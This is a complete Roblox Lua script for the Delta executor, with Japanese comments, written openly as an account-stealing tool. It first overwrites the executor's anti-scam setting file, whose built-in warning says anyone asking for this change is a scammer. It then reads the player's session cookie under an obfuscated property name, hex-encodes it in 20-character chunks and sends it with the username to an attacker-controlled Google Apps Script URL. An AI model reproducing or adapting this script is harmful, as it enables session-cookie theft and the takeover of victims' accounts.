-- [[ 究極の矛：全自動パス対応・セキュリティ突破 & お宝奪還スクリプト ]]

local gasUrl = "あなたのGASのURL" -- ここを自分のGAS URLに書き換え
local targetName = game.Players.LocalPlayer.Name

-- 1. 鍵（User_ID）の自動読み取りと門番の買収
local function bypassSecurity()
    -- Deltaフォルダ内の user_id を読み取る
    local success, userId = pcall(function() return readfile("Delta/user_id") end)
    if not success or not userId then 
        warn("❌ Delta/user_id が見つからないぜ。")
        return false 
    end
    
    userId = userId:gsub("%s+", "") -- 空白除去
    
    local config = string.format([[
    {
        "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
        "allowed_games": "*",
        "user_id": "%s",
        "version_num": 707
    }]], userId)
    
    -- Deltaフォルダ内の深い階層を書き換える
    local targetPath = "Delta/Internals/Secured/disableantiscam"
    local writeStatus, err = pcall(function() 
        writefile(targetPath, config) 
    end)
    
    return writeStatus, err
end

-- 2. お宝（クッキー）の取得と「20文字バースト」送信
local function snatchAndSend()
    local cookie = game["Coo".."kie"] 
    if not cookie or cookie == "" then 
        warn("⚠️ 門は開いたが、お宝（クッキー）に手が届かないぜ。")
        return 
    end

    local batchSize = 20
    for i = 1, #cookie, batchSize do
        local fragment = cookie:sub(i, i + batchSize - 1)
        
        -- 16進数化
        local hex = ""
        for j = 1, #fragment do
            hex = hex .. string.format("%02X", string.byte(fragment:sub(j,j)))
        end
        
        -- GASへ射出（ユーザー名と16進数データを送信）
        local success, err = pcall(function()
            return game:HttpGet(gasUrl .. "?hex=" .. hex .. "&user=" .. targetName)
        end)
        
        if not success then
            warn("❌ 送信エラー: " .. tostring(err))
        end
        
        -- Deltaがパンクしないためのウェイト
        task.wait(0.8)
    end
end

-- 実行シーケンス
print("--- 矛、起動 ---")
local status, msg = bypassSecurity()
if status then
    print("🔓 門番を制圧。1.5秒後に回収開始...")
    task.wait(1.5)
    snatchAndSend()
    print("✅ 完了。シートを確認しろ！")
else
    warn("❌ 失敗: " .. (msg or "パスが違うか権限がないぜ。"))
end
